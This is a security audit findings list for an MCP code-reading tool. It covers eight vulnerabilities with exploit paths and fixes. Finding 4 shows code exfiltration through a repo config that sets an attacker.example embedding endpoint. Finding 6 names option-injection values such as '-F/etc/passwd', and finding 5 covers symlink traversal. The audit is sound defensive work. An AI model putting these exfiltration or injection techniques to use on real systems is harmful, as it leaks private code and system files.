# Security audit findings

## 1. MCP config resource leaks API keys
- **Severity:** High
- **File/line:** `mcp-resources.ts:45-57`, `mcp-resources.ts:87-93`, `config.ts:264-275`
- **Exploit path:** MCP client calls `resources/read` with `smartread://config`. `getResolvedConfig()` returns `validateEmbeddingConfig()` output verbatim, including `embedding.apiKey` and `embedding.externalReranker.apiKey` if configured via env or `pi-smartread.config.json`.
- **Fix:** Redact secrets before JSON serialization. Return only booleans/metadata: `apiKeyConfigured: true`, never raw key. Add regression test for `smartread://config` with `PI_SMARTREAD_EMBEDDING_API_KEY` set.

## 2. Workspace file-read boundary — intentionally unrestricted (by design, not a defect)
- **Severity:** Informational (by design)
- **File/line:** `read-many.ts:1-12`, `utils.ts:283-291`
- **Status:** Direct file reads are **intentionally unrestricted** per the operational invariant (AGENTS.md). `resolveExplicitFile`/`resolveReadPath` resolve paths but do **not** gate them to the workspace; `PI_SMARTREAD_ALLOWED_ROOT` scopes the semantic index, background indexing, and retrieval only — it does **not** gate direct reads. Cross-root reads are permitted by design; permission is enforced externally (by the Pi harness), not in this codebase. `validatePath()` rejects literal `..`; `resolveReadPath()` returns absolute paths unchanged.
- **Do not "fix":** Do not wire `isWithinRoot`/`getAllowedRoot`/`resolveWorkspacePath` into read paths. This is a known, tested, intentional boundary (see `test/unit/workspace-boundary.test.ts`). Escalate rather than silently reversing it.

## 3. Directory parameters allow arbitrary filesystem scans (addressed; allowed-root scopes index/retrieval)
- **Severity:** High (original) — addressed in the hardening pass
- **File/line:** `search-tool.ts`, `find-symbol-tool.ts`, `deep-search-tool.ts`, `repomap-tool.ts`, `git-notes-tool.ts`
- **Status:** `directory` params for search/map/symbol/git tools are now realpath-bounded to the workspace via `resolveDirParam`/`resolveSearchRoot`/`resolveDirectory`/`resolveSearchDirParam` (see `security-boundary-review.md`). The `PI_SMARTREAD_ALLOWED_ROOT` env var scopes the semantic index, background indexing, and retrieval — it does **not** gate direct file reads, which remain intentionally unrestricted (see finding #2).
- **Fix (applied):** Normalize every `directory` against `ctx.cwd`, then require `realpath(directory)` inside `realpath(ctx.cwd)` or an explicit configured allowlist.

## 4. Untrusted repo config can exfiltrate code via embedding/reranker endpoints
- **Severity:** High
- **File/line:** `config.ts:196-219`, `search-tool.ts:211-229`, `intent-read.ts:648-688`, `embedding.ts:91-104`, `rerank.ts:87-116`
- **Exploit path:** Malicious repo commits `pi-smartread.config.json` with `baseUrl: "https://attacker.example/v1"`. User runs `semantic_read` or `search mode=code`; file chunks/query text are POSTed to attacker-controlled `/embeddings` (and reranker may POST documents to `/rerank`).
- **Fix:** Treat repo config as untrusted for network endpoints. Prefer env/user-level config only for `baseUrl`/API keys, or require explicit trust approval per workspace. Add URL allowlist and protocol validation; block unexpected hosts by default.

## 5. Symlink traversal in internal URL and path-inside checks
- **Severity:** Medium
- **File/line:** `skill-protocol.ts:30-41`, `context-graph.ts:57-72`, `context-graph.ts:376-385`
- **Exploit path:** Attacker creates symlink under `~/.pi/agent/skills/<skill>/secret` pointing outside skill base. `skill://<skill>/secret` passes lexical `startsWith()` check and `readFile()` follows symlink. Same pattern exists in `isPathInside()`: lexical inside returns `true` before realpath verification, so graph reads can follow symlinked workspace paths.
- **Fix:** Always compare `realpath(base)` and `realpath(target)` before allowing reads. Do not return true on lexical match until realpath passes; handle non-existing mutation paths separately without read permission.

## 6. Git notes commit argument option injection / ref confusion
- **Severity:** Medium
- **File/line:** `git-notes-tool.ts:104-108`, `git-notes-tool.ts:124-133`, `git-notes.ts:28-47`
- **Exploit path:** Caller supplies `commit` beginning with `-` to `git_notes_read`/`git_notes_write`. `execFile` prevents shell injection, but Git still parses argv options after subcommands; crafted values can alter `git notes show/add` behavior or fail in confusing ways.
- **Fix:** Validate commit-ish before execution: allow `HEAD`, full/short hex SHA, or safe ref regex only; reject values starting with `-`. Insert `--` before commit-ish where Git supports it. Add tests for `commit: "--help"` and `commit: "-F/etc/passwd"` rejection.

## 7. Graph mutation log is unauthenticated, unbounded, and replay-trusted
- **Severity:** Medium
- **File/line:** `graph-mutate.ts:65-74`, `context-graph.ts:711-731`, `context-graph.ts:745-768`, `context-graph.ts:775-786`
- **Exploit path:** If experimental `graph_mutate` is enabled, any MCP caller can append high-confidence breakage/co-change edges. Direct file modification of `.pi-smartread/graph-mutations.jsonl` is also replayed without schema/path revalidation. Large `context`/many events can grow log and affect retrieval integrity/availability.
- **Fix:** Validate replayed events with same root/path rules; cap context length and event count; stream/tail read instead of `readFileSync` whole log; optionally sign events or restrict mutation tool to trusted local caller/SmartEdit pipeline.

## 8. Cache and graph files use default filesystem permissions
- **Severity:** Low
- **File/line:** `cache.ts:96-132`, `cache.ts:220-223`, `persistent-embedding-cache.ts:45-48`, `persistent-embedding-cache.ts:120-128`, `context-graph.ts:779-786`
- **Exploit path:** Tags cache, embedding cache, and graph mutation files are created with process umask defaults. On permissive multi-user systems, other users can read symbol names, file paths, graph relations, and embedding vectors or tamper with graph mutation logs.
- **Fix:** Create cache dirs with `mode: 0o700`; write files with `mode: 0o600`; verify existing dirs/files are not world-writable before use; document cache sensitivity.
